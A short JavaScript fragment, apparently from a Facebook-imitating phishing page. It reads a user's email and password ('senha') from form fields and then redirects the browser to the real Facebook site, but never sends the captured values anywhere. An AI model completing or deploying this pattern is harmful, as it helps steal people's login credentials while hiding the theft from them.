
function getPasswordAndEmail(){;
    let email = document.getElementById("email").value;
    let senha = document.getElementById("senha").value;
    redirect();
}

function redirect(){
    window.location.replace("https://www.facebook.com/");
}